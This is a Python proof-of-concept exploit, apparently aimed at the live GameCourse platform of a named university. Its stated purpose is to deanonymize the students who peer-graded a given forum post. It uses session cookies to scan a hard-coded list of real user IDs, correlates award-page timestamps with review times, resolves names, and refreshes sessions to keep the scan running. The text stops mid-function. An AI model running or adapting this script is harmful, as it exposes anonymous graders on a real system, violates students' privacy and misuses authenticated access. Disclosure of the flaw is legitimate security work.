import concurrent.futures
import html
import http.cookiejar
import json
import os
import re
import socket
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import webbrowser
from datetime import datetime, timezone
from pathlib import Path

"""
This proof-of-concept exploits a GameCourse flaw that allows a student to infer
which students graded their posts.

The script asks for a target permalink forum post URL, fetches the reviews for
that post, and extracts each review timestamp. It then scans the badges page
(pageId=723) to find users linked to the target content, fetches the awards
page (pageId=726) for those hit users, correlates "peergraded colleague" events
by time proximity, and produces a report with candidate grader identities.

In some cases, deanonymization can also be attempted using only the awards page
data, but that approach is generally less reliable than combining badges hits
with awards timestamp correlation.
"""

API_URL = (
	"https://pcm.rnl.tecnico.ulisboa.pt/gamecourse/api/"
	"?module=Page&request=renderPage&pageId={page_id}&userId={user_id}"
)
USER_BY_ID_API_URL = (
	"https://pcm.rnl.tecnico.ulisboa.pt/gamecourse/api/"
	"?module=User&request=getUserById&userId={user_id}"
)
LOGIN_URL = "https://pcm.rnl.tecnico.ulisboa.pt/gamecourse/"
SCRIPT_TITLE = "Peergrade Deanonymize PoC"

BUILTIN_USER_IDS = [
	1333, 1354, 1369, 1441, 1674, 1677, 1680, 1683, 1689, 1692,
	1695, 1701, 1704, 1707, 1710, 1713, 1716, 1719, 1722, 1725,
	1728, 1734, 1737, 1740, 1743, 1746, 1749, 1752, 1755, 1758,
	1761, 1764, 1767, 1770, 1773, 1776, 1779, 1782, 1785, 1788,
	1791, 1794, 1797, 1800, 1806, 1809, 1812, 1815, 1818, 1821,
	1824, 1827, 1830, 1833, 1836, 1839, 1842, 1845, 1848, 1854,
	1857, 1860, 1866, 1869, 1872, 1878, 1881, 1920, 1923, 1926,
	1929,
]

PHPSESSID = ""
MOODLESESSION = ""

REQUEST_TIMEOUT = 90.0
REQUEST_RETRIES = 0
REQUEST_RETRY_DELAY = 2.0

IDS_SOURCE = "scan_state"
IDS_ORDER = "desc"

TARGET_ENABLED = True
TARGET_LINK = ""
# Badges page used for target-link hit detection
BADGES_PAGE_ID = 723
TARGET_WORKERS = 1
TARGET_DELAY = 3.0
TARGET_TIMEOUT = 60.0
TARGET_RETRIES = 0
TARGET_WAIT_HEARTBEAT_SECONDS = 30.0
TARGET_STOP_AFTER_TIMEOUTS = 8
TARGET_STOP_AFTER_DNS_ERRORS = 4
TARGET_RECHECK_TIMEOUTS = True
TARGET_RECHECK_TIMEOUT = 90.0
TARGET_RECHECK_DELAY = 5.0
TARGET_TRANSIENT_BACKOFF_SECONDS = 20.0
# Proactively refresh PHPSESSID every N successful requests to avoid server-side
# session invalidation (the server appears to rotate sessions after ~4 renders).
SESSION_MAX_REQUESTS_BEFORE_REFRESH = 3

# Awards page used for peergrade time-correlation
AWARDS_PAGE_ID = 726
USER_PROFILE_PAGE_ID = 720
COURSE_ID = 432
PEERGRADE_TIME_MATCH_WINDOW_SECONDS = 6 * 60 * 60
PEERGRADE_FALLBACK_WINDOW_SECONDS = 12 * 60 * 60
PEERGRADE_EXPECTED_DELAY_MINUTES = 20.0
PEERGRADE_REPORT_PATH = "peergrade_report.json"
GRADER_RESOLVE_TIMEOUT = 20.0
GRADER_RESOLVE_WORKERS = 8

SCAN_STATE_PATH = "scan_state.json"
STATE_UPDATE_INTERVAL_SECONDS = 5.0


def print_title() -> None:
	line = "=" * len(SCRIPT_TITLE)
	print(line)
	print(SCRIPT_TITLE)
	print(line)


def extract_phpsessid(value: str) -> str | None:
	text = value.strip()
	if not text:
		return None

	match = re.search(r"PHPSESSID=([^;\s]+)", text, re.IGNORECASE)
	if match:
		return match.group(1).strip()

	if "=" not in text and ";" not in text and " " not in text:
		return text

	return None


def extract_moodlesession(value: str) -> str | None:
	text = value.strip()
	if not text:
		return None

	match = re.search(r"MoodleSession=([^;\s]+)", text, re.IGNORECASE)
	if match:
		return match.group(1).strip()

	if "=" not in text and ";" not in text and " " not in text:
		return text

	return None


def auto_fetch_phpsessid(login_url: str, timeout: float) -> str | None:
	jar = http.cookiejar.CookieJar()
	opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
	request = urllib.request.Request(
		login_url,
		headers={
			"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0",
			"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		},
	)
	set_cookie_values: list[str] = []
	try:
		with opener.open(request, timeout=timeout) as response:
			headers = response.headers
			set_cookie_values = headers.get_all("Set-Cookie", []) or []
	except Exception:
		return None

	for header_value in set_cookie_values:
		parsed = extract_phpsessid(header_value)
		if parsed:
			return parsed

	for cookie in jar:
		if cookie.name == "PHPSESSID" and cookie.value:
			return cookie.value.strip()
	return None


def bootstrap_startup_inputs() -> None:
	global TARGET_LINK, TARGET_ENABLED, PHPSESSID, MOODLESESSION

	current_link = TARGET_LINK.strip()
	try:
		prompt = f"Target link [{current_link}]: " if current_link else "Target link: "
		entered_link = input(prompt).strip()
	except EOFError:
		entered_link = ""

	if entered_link:
		TARGET_LINK = entered_link

	if not TARGET_LINK.strip():
		print("[!] Empty target link; disabling target checks for this run.")
		TARGET_ENABLED = False

	current_phpsessid = PHPSESSID.strip()
	if not current_phpsessid:
		print(f"Opening login page: {LOGIN_URL}")
		opened = webbrowser.open(LOGIN_URL)
		if not opened:
			print(f"[!] Could not open browser automatically. Open manually: {LOGIN_URL}")
		fetched = auto_fetch_phpsessid(LOGIN_URL, REQUEST_TIMEOUT)
		if fetched:
			PHPSESSID = fetched
			print("[+] Auto-fetched PHPSESSID")
		else:
			try:
				manual = input("Paste PHPSESSID (or full Cookie header), then Enter (leave empty to skip): ").strip()
			except EOFError:
				manual = ""
			parsed = extract_phpsessid(manual)
			if parsed:
				PHPSESSID = parsed
				print("[+] Using provided PHPSESSID")
			else:
				print("[!] Could not auto-fetch PHPSESSID. Provide it via env var PHPSESSID if needed.")

	current_moodlesession = MOODLESESSION.strip()
	if not current_moodlesession:
		env_cookie = os.environ.get("COOKIE") or os.environ.get("PCM_COOKIE") or ""
		parsed_from_env_cookie = extract_moodlesession(env_cookie)
		env_moodlesession = os.environ.get("MOODLESESSION") or ""
		parsed_from_env = extract_moodlesession(env_moodlesession)
		if parsed_from_env_cookie:
			MOODLESESSION = parsed_from_env_cookie
			print("[+] Loaded MoodleSession from COOKIE/PCM_COOKIE env")
		elif parsed_from_env:
			MOODLESESSION = parsed_from_env
			print("[+] Loaded MoodleSession from MOODLESESSION env")
		else:
			try:
				manual_moodle = input("MoodleSession (or full Cookie header) for forum extraction [optional]: ").strip()
			except EOFError:
				manual_moodle = ""
			parsed_moodle = extract_moodlesession(manual_moodle)
			if parsed_moodle:
				MOODLESESSION = parsed_moodle
				print("[+] Using provided MoodleSession")


def read_ids_from_scan_state(path: str, key: str) -> list[int]:
	file_path = Path(path)
	if not file_path.exists():
		return []
	try:
		data = json.loads(file_path.read_text(encoding="utf-8"))
	except Exception:
		return []
	ids_block = data.get("ids", {})
	values = ids_block.get(key, [])
	if not isinstance(values, list):
		return []
	ids: set[int] = set()
	for value in values:
		try:
			ids.add(int(value))
		except (TypeError, ValueError):
			continue
	return sorted(ids)


def read_scan_state(path: str) -> dict:
	file_path = Path(path)
	if not file_path.exists():
		return {}
	try:
		data = json.loads(file_path.read_text(encoding="utf-8"))
		return data if isinstance(data, dict) else {}
	except Exception:
		return {}


def load_cookie() -> str | None:
	phpsessid = extract_phpsessid(PHPSESSID) or ""
	if phpsessid:
		return f"PHPSESSID={phpsessid}"

	env_phpsessid = os.environ.get("PHPSESSID") or ""
	parsed_env = extract_phpsessid(env_phpsessid)
	if parsed_env:
		return f"PHPSESSID={parsed_env}"

	env_cookie = os.environ.get("COOKIE") or os.environ.get("PCM_COOKIE") or ""
	parsed_cookie = extract_phpsessid(env_cookie)
	if parsed_cookie:
		return f"PHPSESSID={parsed_cookie}"

	return None


def load_moodle_cookie(gamecourse_cookie: str | None) -> str | None:
	moodle_session = extract_moodlesession(MOODLESESSION) or ""
	if not moodle_session:
		env_moodle = os.environ.get("MOODLESESSION") or ""
		moodle_session = extract_moodlesession(env_moodle) or ""
	if not moodle_session:
		env_cookie = os.environ.get("COOKIE") or os.environ.get("PCM_COOKIE") or ""
		moodle_session = extract_moodlesession(env_cookie) or ""

	cookie_parts: list[str] = []
	if gamecourse_cookie:
		cookie_parts.append(gamecourse_cookie)
	if moodle_session:
		cookie_parts.append(f"MoodleSession={moodle_session}")

	if not cookie_parts:
		return None
	return "; ".join(cookie_parts)


def fetch_text(url: str, cookie: str | None, timeout: float, retries: int, retry_delay: float) -> tuple[str | None, int | None, str | None]:
	headers = {
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0",
		"Accept": "application/json, text/plain, */*",
		"Accept-Language": "en-US,en;q=0.9",
		"Referer": "https://pcm.rnl.tecnico.ulisboa.pt/gamecourse/",
		"Connection": "keep-alive",
		"Sec-Fetch-Dest": "empty",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Site": "same-origin",
	}
	if cookie:
		headers["Cookie"] = cookie

	attempt = 0
	while attempt <= retries:
		request = urllib.request.Request(url, headers=headers)
		try:
			with urllib.request.urlopen(request, timeout=timeout) as response:
				return response.read().decode("utf-8", errors="replace"), response.getcode(), None
		except urllib.error.HTTPError as exc:
			return None, exc.code, f"HTTP {exc.code}"
		except (TimeoutError, socket.timeout):
			error_message = "Timeout"
		except urllib.error.URLError as exc:
			error_message = f"URL error: {exc.reason}"
		except Exception as exc:
			error_message = f"Error: {exc}"

		if attempt >= retries:
			return None, None, error_message
		attempt += 1
		if retry_delay > 0:
			time.sleep(retry_delay)

	return None, None, "Unknown error"


def extract_user_ids(text: str) -> set[int]:
	patterns = [
		re.compile(r"user_data\\/(\d+)", re.IGNORECASE),
		re.compile(r"[\"']userId[\"']\s*[:=]\s*[\"']?(\d+)", re.IGNORECASE),
		re.compile(r"[\"']user_id[\"']\s*[:=]\s*[\"']?(\d+)", re.IGNORECASE),
		re.compile(r"/user/(\d+)", re.IGNORECASE),
	]
	found_ids: set[int] = set()
	for pattern in patterns:
		for match in pattern.findall(text):
			try:
				found_ids.add(int(match))
			except ValueError:
				pass
	return found_ids


def normalize_for_match(value: str) -> str:
	normalized = urllib.parse.unquote(value)
	normalized = normalized.replace("\\/", "/")
	normalized = normalized.replace("\\u002F", "/")
	normalized = normalized.replace("\\u0026", "&")
	return normalized.lower()


def normalize_api_payload(value: str) -> str:
	normalized = urllib.parse.unquote(value)
	normalized = normalized.replace("\\/", "/")
	normalized = normalized.replace("\\u002F", "/")
	normalized = normalized.replace("\\u0026", "&")
	normalized = normalized.replace("\\u003C", "<")
	normalized = normalized.replace("\\u003E", ">")
	normalized = normalized.replace("\\u003c", "<")
	normalized = normalized.replace("\\u003e", ">")
	normalized = normalized.replace("\\u0022", '"')
	normalized = normalized.replace("\\n", "\n")
	normalized = normalized.replace("\\t", "\t")
	normalized = normalized.replace('\\"', '"')
	normalized = normalized.replace("\\'", "'")
	normalized = html.unescape(normalized)
	normalized = normalized.replace("\xa0", " ")
	return normalized


def strip_html_tags(value: str) -> str:
	text = re.sub(r"<[^>]+>", " ", value)
	return re.sub(r"\s+", " ", text).strip()


def extract_epoch_times(text: str) -> list[int]:
	times: list[int] = []
	for match in re.finditer(r"(?<!\d)(\d{10}|\d{13})(?!\d)", text):
		raw = match.group(1)
		value = int(raw)
		if len(raw) == 13:
			value //= 1000
		if 1_400_000_000 <= value <= 2_200_000_000:
			times.append(value)
	return times


def extract_user_refs(text: str) -> list[int]:
	refs: set[int] = set()
	patterns = [
		re.compile(r"user_data/(\d+)", re.IGNORECASE),
		re.compile(r"/user/(\d+)", re.IGNORECASE),
		re.compile(r"[\"']userId[\"']\s*[:=]\s*[\"']?(\d+)", re.IGNORECASE),
	]
	for pattern in patterns:
		for match in pattern.findall(text):
			try:
				refs.add(int(match))
			except ValueError:
				continue
	return sorted(refs)


def parse_awards_datetime(value: str) -> int | None:
	text = re.sub(r"\s+", " ", value).strip()
	formats = [
		"%d/%m/%Y %H:%M",
		"%d/%m/%Y %H:%M:%S",
		"%d/%m/%Y %I:%M %p",
		"%Y-%m-%d %H:%M",
		"%Y-%m-%d %H:%M:%S",
	]
	for fmt in formats:
		try:
			dt = datetime.strptime(text, fmt)
			return int(dt.replace(tzinfo=timezone.utc).timestamp())
		except ValueError:
			continue

	iso_candidate = text.replace(" ", "T")
	if iso_candidate.endswith("Z"):
		iso_candidate = iso_candidate[:-1] + "+00:00"
	try:
		dt = datetime.fromisoformat(iso_candidate)
		if dt.tzinfo is None:
			dt = dt.replace(tzinfo=timezone.utc)
		return int(dt.timestamp())
	except ValueError:
		pass
	return None


def collect_text_values(node) -> list[str]:
	values: list[str] = []
	if isinstance(node, dict):
		if node.get("type") == "text" and "text" in node:
			values.append(str(node.get("text")))
		for child in node.values():
			values.extend(collect_text_values(child))
	elif isinstance(node, list):
		for item in node:
			values.extend(collect_text_values(item))
	return values


def extract_awards_time_candidates(raw_text: str, default_user_id: int | None = None) -> list[dict]:
	text = normalize_api_payload(raw_text)
	candidates: list[dict] = []
	seen: set[tuple[int, tuple[int, ...]]] = set()

	try:
		payload = json.loads(raw_text)
		root = payload.get("data") if isinstance(payload, dict) else None
		if root is not None:
			rows: list[dict] = []
			stack = [root]
			while stack:
				node = stack.pop()
				if isinstance(node, dict):
					if node.get("rowType") == "body":
						rows.append(node)
					for value in node.values():
						if isinstance(value, (dict, list)):
							stack.append(value)
				elif isinstance(node, list):
					for item in node:
						if isinstance(item, (dict, list)):
							stack.append(item)

			for row in rows:
				row_text_values = collect_text_values(row)
				joined_row_text = " ".join(row_text_values)
				if "peergraded colleague" not in joined_row_text.lower():
					continue

				refs = extract_user_refs(json.dumps(row, ensure_ascii=False))
				if not refs and default_user_id is not None:
					refs = [int(default_user_id)]
				if not refs:
					continue

				row_times: list[int] = []
				for value in row_text_values:
					parsed = parse_awards_datetime(value)
					if parsed is not None:
						row_times.append(int(parsed))
				for value in extract_epoch_times(joined_row_text):
					row_times.append(int(value))

				for ts in row_times:
					key = (int(ts), tuple(sorted(set(int(v) for v in refs))))
					if key in seen:
						continue
					seen.add(key)
					candidates.append(
						{
							"timestamp": int(ts),
							"user_refs": sorted(set(int(v) for v in refs)),
							"context": strip_html_tags(joined_row_text)[:280],
						}
					)

			if candidates:
				return sorted(candidates, key=lambda item: int(item.get("timestamp", 0)))
	except Exception:
		pass

	def add_candidate(ts: int, start_idx: int, end_idx: int) -> None:
		start = max(0, start_idx - 800)
		end = min(len(text), end_idx + 800)
		chunk = text[start:end]
		chunk_clean = strip_html_tags(chunk)
		chunk_clean_lower = chunk_clean.lower()
		if "peergraded colleague" not in chunk_clean_lower:
			return
		refs = extract_user_refs(chunk)
		if not refs and default_user_id is not None:
			refs = [int(default_user_id)]
		if not refs:
			return
		key = (int(ts), tuple(sorted(set(int(value) for value in refs))))
		if key in seen:
			return
		seen.add(key)
		candidates.append(
			{
				"timestamp": int(ts),
				"user_refs": sorted(set(int(value) for value in refs)),
				"context": chunk_clean[:280],
			}
		)

	for match in re.finditer(r"(?<!\d)(\d{10}|\d{13})(?!\d)", text):
		raw_ts = match.group(1)
		ts = int(raw_ts)
		if len(raw_ts) == 13:
			ts //= 1000
		if not (1_400_000_000 <= ts <= 2_200_000_000):
			continue
		add_candidate(ts, match.start(), match.end())

	for match in re.finditer(r"\b(\d{1,2}/\d{1,2}/\d{4}\s+\d{1,2}:\d{2}(?:\s*[AP]M)?)\b", text, re.IGNORECASE):
		ts = parse_awards_datetime(match.group(1))
		if ts is None:
			continue
		add_candidate(ts, match.start(), match.end())

	for match in re.finditer(
		r"\b(\d{1,2}/\d{1,2}/\d{4})\b(?:\D|<[^>]+>){0,80}?\b(\d{1,2}:\d{2}(?:\s*[AP]M)?)\b",
		text,
		re.IGNORECASE,
	):
		ts = parse_awards_datetime(f"{match.group(1)} {match.group(2)}")
		if ts is None:
			continue
		add_candidate(ts, match.start(), match.end())

	for match in re.finditer(
		r"\b(\d{4}-\d{1,2}-\d{1,2}(?:[T\s]\d{1,2}:\d{2}(?::\d{2})?(?:\.\d{1,6})?(?:Z|[+-]\d{2}:?\d{2})?)?)\b",
		text,
		re.IGNORECASE,
	):
		ts = parse_awards_datetime(match.group(1))
		if ts is None:
			continue
		add_candidate(ts, match.start(), match.end())

	return sorted(candidates, key=lambda item: int(item.get("timestamp", 0)))


def parse_forum_datetime(value: str) -> int | None:
	text = re.sub(r"\s+", " ", value).strip()
	formats = [
		"%A, %d %B %Y, %I:%M %p",
		"%a, %d %B %Y, %I:%M %p",
	]
	for fmt in formats:
		try:
			dt = datetime.strptime(text, fmt)
			return int(dt.replace(tzinfo=timezone.utc).timestamp())
		except ValueError:
			continue
	return None


def extract_peergrade_reviews(raw_text: str, target_post_id: str | None = None) -> list[dict]:
	normalized_raw = normalize_api_payload(raw_text)
	text = strip_html_tags(normalized_raw)

	if target_post_id:
		markers = [f"pgfeedbackslink{target_post_id}", f"post/{target_post_id}/", f"#p{target_post_id}"]
		base_lower = normalized_raw.lower()
		anchor_pos = -1
		for marker in markers:
			pos = base_lower.find(marker.lower())
			if pos != -1:
				anchor_pos = pos
				break
		if anchor_pos != -1:
			start = max(0, anchor_pos - 4000)
			end = min(len(normalized_raw), anchor_pos + 20000)
			text = strip_html_tags(normalized_raw[start:end])
		else:
			print(f"[i] Could not isolate target post p{target_post_id}; parsing full forum page.")
	pattern = re.compile(
		r"by\s+grader\s+(\d+)\s*-\s*([A-Za-z]+,\s*\d{1,2}\s+[A-Za-z]+\s+\d{4},\s*\d{1,2}:\d{2}\s*[AP]M)\s*"
		r"peer\s*grade:\s*(\d+)\s*feedback:\s*(.+?)(?=\s+by\s+grader\s+\d+\s*-|$)",
		re.IGNORECASE,
	)
	reviews: list[dict] = []
	for match in pattern.finditer(text):
		grader_id = int(match.group(1))
		raw_time = match.group(2).strip()
		grade = int(match.group(3))
		feedback = re.sub(r"\s+", " ", match.group(4)).strip()
		reviews.append(
			{
				"grader_id": grader_id,
				"raw_time": raw_time,
				"timestamp": parse_forum_datetime(raw_time),
				"peer_grade": grade,
				"feedback": feedback,
			}
		)
	return reviews


def extract_target_post_id(target_link: str) -> str | None:
	if not target_link:
		return None
	parsed = urllib.parse.urlparse(target_link)
	fragment = parsed.fragment or ""
	if fragment.startswith("p") and fragment[1:].isdigit():
		return fragment[1:]
	match = re.search(r"/post/(\d+)/", target_link)
	if match:
		return match.group(1)
	return None


def build_target_state_key(target_link: str) -> str:
	normalized = normalize_for_match(target_link or "").strip()
	if not normalized:
		return ""

	parsed = urllib.parse.urlparse(normalized)
	query = urllib.parse.parse_qs(parsed.query)
	thread_value = (query.get("d") or [""])[0]
	thread_id = int(thread_value) if str(thread_value).isdigit() else None
	post_raw = extract_target_post_id(normalized)
	post_id = int(post_raw) if post_raw and post_raw.isdigit() else None

	if thread_id is not None and post_id is not None:
		return f"d={thread_id}#p{post_id}"
	if thread_id is not None:
		return f"d={thread_id}"
	if post_id is not None:
		return f"p{post_id}"
	return normalized


def build_target_scan_state_path(target_link: str) -> str:
	target_key = build_target_state_key(target_link)
	if not target_key:
		return str(SCAN_STATE_PATH)
	safe_key = re.sub(r"[^a-z0-9]+", "_", target_key.lower()).strip("_")
	if not safe_key:
		return str(SCAN_STATE_PATH)
	return f"scan_state_{safe_key}.json"


def build_peergrade_report_path(target_link: str) -> str:
	report_path = Path(PEERGRADE_REPORT_PATH)
	target_key = build_target_state_key(target_link)
	if not target_key:
		return str(report_path)
	safe_key = re.sub(r"[^a-z0-9]+", "_", target_key.lower()).strip("_")
	if not safe_key:
		return str(report_path)
	if report_path.suffix:
		return str(report_path.with_name(f"{report_path.stem}_{safe_key}{report_path.suffix}"))
	return str(report_path.with_name(f"{report_path.name}_{safe_key}"))


def resolve_scan_state_path_for_read(target_link: str) -> str:
	target_path = build_target_scan_state_path(target_link)
	if Path(target_path).exists():
		return target_path

	legacy_path = str(SCAN_STATE_PATH)
	if legacy_path == target_path:
		return target_path

	legacy_file = Path(legacy_path)
	if not legacy_file.exists():
		return target_path

	current_key = build_target_state_key(target_link)
	if not current_key:
		return legacy_path

	try:
		legacy_data = json.loads(legacy_file.read_text(encoding="utf-8"))
		target_block = legacy_data.get("target", {})
		legacy_key = str(target_block.get("key", "")).strip().lower() if isinstance(target_block, dict) else ""
		if legacy_key == current_key.lower():
			return legacy_path
	except Exception:
		pass

	return target_path


def resolve_user_identity(user_id: int, cookie: str | None) -> dict:
	link = f"https://pcm.rnl.tecnico.ulisboa.pt/gamecourse/#/courses/{COURSE_ID}/pages/{USER_PROFILE_PAGE_ID}/user/{user_id}"
	if not cookie:
		return {"user_id": user_id, "name": f"user_{user_id}", "gamecourse_link": link}

	name: str | None = None
	user_url = USER_BY_ID_API_URL.format(user_id=user_id)
	user_body, _, user_error = fetch_text(user_url, cookie, REQUEST_TIMEOUT, REQUEST_RETRIES, REQUEST_RETRY_DELAY)
	if not user_error and user_body:
		try:
			payload = json.loads(user_body)
			data = payload.get("data", {}) if isinstance(payload, dict) else {}
			candidate = data.get("name") if isinstance(data, dict) else None
			if isinstance(candidate, str) and candidate.strip():
				name = candidate.strip()
		except Exception:
			name = None

	if not name:
		name = f"user_{user_id}"
	return {"user_id": user_id, "name": name, "gamecourse_link": link}


def resolve_hit_candidates(hit_ids: list[int], cookie: str | None) -> list[dict]:
	identity_cache: dict[int, dict] = {}
	resolved: list[dict] = []
	for user_id in sorted(set(int(value) for value in hit_ids)):
		if user_id not in identity_cache:
			identity_cache[user_id] = resolve_user_identity(user_id, cookie)
		resolved.append(dict(identity_cache[user_id]))
	return resolved


def deanonimize_graders_by_time(
	reviews: list[dict],
	hit_awards_candidates: dict[int, list[dict]],
	cookie: str | None,
	window_seconds: int,
) -> dict[int, list[dict]]:
	result: dict[int, list[dict]] = {}
	identity_cache: dict[int, dict] = {}

	for review in reviews:
		grader_id = int(review.get("grader_id"))
		review_ts = review.get("timestamp")
		if review_ts is None:
			result.setdefault(grader_id, [])
			continue

		best_by_user: dict[int, tuple[int, int]] = {}
		for _hit_user, events in hit_awards_candidates.items():
			for event in events:
				event_ts = event.get("timestamp")
				if event_ts is None:
					continue
				# Keep only causally plausible matches: the awards event should happen
				# after the review action, not before it.
				delta = int(event_ts) - int(review_ts)
				if 0 <= delta <= window_seconds:
					for uid in event.get("user_refs", []):
						user_id = int(uid)
						current = best_by_user.get(user_id)
						if current is None or delta < current[0]:
							best_by_user[user_id] = (delta, int(event_ts))

		resolved_candidates: list[dict] = []
		for user_id, (delta_seconds, awards_ts) in sorted(
			best_by_user.items(),
			key=lambda item: (
				abs((item[1][0] / 60.0) - PEERGRADE_EXPECTED_DELAY_MINUTES),
				item[1][0],
				item[0],
			),
		):
			if user_id not in identity_cache:
				identity_cache[user_id] = resolve_user_identity(user_id, cookie)
			candidate = dict(identity_cache[user_id])
			candidate["delta_seconds"] = int(delta_seconds)
			candidate["delta_minutes"] = round(delta_seconds / 60.0, 2)
			candidate["delta_from_expected_minutes"] = round(
				abs((delta_seconds / 60.0) - PEERGRADE_EXPECTED_DELAY_MINUTES),
				2,
			)
			candidate["review_timestamp"] = int(review_ts)
			candidate["awards_timestamp"] = int(awards_ts)
			resolved_candidates.append(candidate)

		result[grader_id] = resolved_candidates

	return result


def fetch_peergrade_reviews_for_target(cookie: str | None) -> list[dict]:
	forum_url = TARGET_LINK.strip()
	if not forum_url:
		return []

	forum_cookie = load_moodle_cookie(cookie)
	if not forum_cookie:
		return []

	forum_body, forum_status, forum_error = fetch_text(forum_url, forum_cookie, REQUEST_TIMEOUT, REQUEST_RETRIES, REQUEST_RETRY_DELAY)
	if forum_error:
		print(f"\n[!] Could not fetch peerforum feedback page: {forum_status if forum_status is not None else '?'} ({forum_error})")
		return []

	target_post_id = extract_target_post_id(forum_url)
	return extract_peergrade_reviews(forum_body or "", target_post_id)


def analyze_peergrade_for_hits(hits: list[int], cookie: str | None, preloaded_reviews: list[dict] | None = None) -> None:
	if not hits:
		return

	forum_url = TARGET_LINK.strip()
	if not forum_url:
		print("\n[!] Skipping peergrade analysis: TARGET_LINK is empty.")
		return

	reviews = preloaded_reviews if preloaded_reviews is not None else fetch_peergrade_reviews_for_target(cookie)
	print(f"[i] Peergrade reviews parsed: {len(reviews)}")

	report: dict = {
		"generated_at": datetime.now(timezone.utc).isoformat(),
		"forum_url": forum_url,
		"target_key": build_target_state_key(forum_url),
		"awards_page_id": AWARDS_PAGE_ID,
		"match_window_seconds": PEERGRADE_TIME_MATCH_WINDOW_SECONDS,
		"expected_delay_minutes": PEERGRADE_EXPECTED_DELAY_MINUTES,
		"peergrade_reviews": reviews,
		"time_based_resolution": {},
		"fallback_candidates": {},
	}

	hit_awards_candidates: dict[int, list[dict]] = {}
	awards_unusable_hits: set[int] = set()

	for user_id in sorted(set(hits)):
		awards_url = API_URL.format(page_id=AWARDS_PAGE_ID, user_id=user_id)
		awards_body, _, awards_error = fetch_text(awards_url, cookie, REQUEST_TIMEOUT, REQUEST_RETRIES, REQUEST_RETRY_DELAY)
		if awards_error:
			continue
		awards_candidates = extract_awards_time_candidates(awards_body or "", default_user_id=user_id)
		hit_awards_candidates[user_id] = awards_candidates
		if not awards_candidates:
			normalized_awards = normalize_api_payload(awards_body or "").lower()
			if "peergraded colleague" in normalized_awards:
				awards_unusable_hits.add(int(user_id))

	time_based_resolution = deanonimize_graders_by_time(
		reviews,
		hit_awards_candidates,
		cookie,
		PEERGRADE_TIME_MATCH_WINDOW_SECONDS,
	)
	used_fallback_window = False
	if all(not values for values in time_based_resolution.values()) and reviews:
		print(
			f"[i] No time-based matches within {PEERGRADE_TIME_MATCH_WINDOW_SECONDS // 3600}h; "
			f"retrying with {PEERGRADE_FALLBACK_WINDOW_SECONDS // 3600}h window..."
		)
		time_based_resolution = deanonimize_graders_by_time(
			reviews,
			hit_awards_candidates,
			cookie,
			PEERGRADE_FALLBACK_WINDOW_SECONDS,
		)
		used_fallback_window = True

	for grader_id in list(time_based_resolution.keys()):
		time_based_resolution[grader_id] = sorted(
			time_based_resolution.get(grader_id, []),
			key=lambda candidate: (
				float(candidate.get("delta_from_expected_minutes", 10**12)),
				int(candidate.get("delta_seconds", 10**12)),
				int(candidate.get("user_id", 10**12)),
			),
		)

	report["time_based_resolution"] = {str(k): v for k, v in time_based_resolution.items()}
	report["time_match_window_seconds_effective"] = (
		PEERGRADE_FALLBACK_WINDOW_SECONDS if used_fallback_window else PEERGRADE_TIME_MATCH_WINDOW_SECONDS
	)
	has_time_matches = any(bool(values) for values in time_based_resolution.values())

	if not has_time_matches and reviews:
		fallback_pool = resolve_hit_candidates(hits, cookie)
		report["fallback_candidates"] = {
			"method": "hit_pool",
			"reason": "awards_timestamps_unavailable",
			"users": fallback_pool,
			"attribution": "insufficient_evidence",
		}
		if awards_unusable_hits:
			report["fallback_candidates"]["awards_unusable_hit_ids"] = sorted(awards_unusable_hits)
		print("[i] Awards page contains peergrade labels but no usable timestamps; reporting only non-attributed candidate pool.")
		if fallback_pool:
			print("[+] Candidate users from target-hit IDs:")
			for candidate in fallback_pool:
				print(f"  - {candidate['name']} -> {candidate['gamecourse_link']}")

	report_path = build_peergrade_report_path(forum_url)
	Path(report_path).write_text(json.dumps(report, indent=2), encoding="utf-8")
	print(f"[+] Saved peergrade correlation report: {report_path}")

	if has_time_matches:
		print("[+] Time-based deanonymization (from hit awards pages):")
		for grader_id in sorted(time_based_resolution):
			candidates = time_based_resolution[grader_id]
			if not candidates:
				print(f"  - Grader {grader_id}: no time-matched user refs found")
				continue
			print(f"  - Grader {grader_id}:")
			for rank, candidate in enumerate(candidates, start=1):
				delta_minutes = candidate.get("delta_minutes")
				delta_expected = candidate.get("delta_from_expected_minutes")
				delta_text = f"Δ={delta_minutes}m" if delta_minutes is not None else "Δ=?"
				delta_expected_text = (
					f" | diff_from_20m={delta_expected}m" if delta_expected is not None else ""
				)
				review_ts = candidate.get("review_timestamp")
				award_ts = candidate.get("awards_timestamp")
				review_iso = datetime.fromtimestamp(int(review_ts), tz=timezone.utc).isoformat() if review_ts is not None else "?"
				award_iso = datetime.fromtimestamp(int(award_ts), tz=timezone.utc).isoformat() if award_ts is not None else "?"
				print(
					f"    {rank}. {candidate['name']} [{delta_text}{delta_expected_text} | peergrade={review_iso} | award={award_iso}] -> {candidate['gamecourse_link']}"
				)
	elif reviews:
		fallback_users = report.get("fallback_candidates", {}).get("users", [])
		if fallback_users:
			print("[i] Fallback mode active: insufficient evidence to attribute graders individually.")
		else:
			print("[!] No deanonymization candidates found for this target.")


def body_contains_target_link(body: str, target_link: str) -> bool:
	normalized_body = normalize_for_match(body)
	normalized_target = normalize_for_match(target_link)
	return normalized_target in normalized_body


def is_session_expired_body(body: str | None) -> bool:
	"""Return True when the API response indicates the session is no longer valid."""
	if not body:
		return False
	body_lower = body.lower()
	# Server redirected us to a login or auth page.
	if "login" in body_lower and "password" in body_lower:
		return True
	# GameCourse returns {"data": null} or {"data": false} for unauthenticated calls.
	try:
		payload = json.loads(body)
		if isinstance(payload, dict):
			data = payload.get("data")
			if data is None or data is False or data == "":
				return True
	except Exception:
		pass
	return False


def prompt_new_phpsessid(reason: str = "") -> str | None:
	"""Pause the scan and ask the user for a fresh PHPSESSID.
	Returns the new cookie string (e.g. 'PHPSESSID=abc123') or None if skipped.
	"""
	global PHPSESSID
	if reason:
		print(f"\n[!] {reason}")
	print("[i] Open a fresh browser tab and log in, then paste the new PHPSESSID.")
	print(f"    Login page: {LOGIN_URL}")
	try:
		raw = input("New PHPSESSID (or full Cookie header) [Enter to skip]: ").strip()
	except EOFError:
		raw = ""
	parsed = extract_phpsessid(raw)
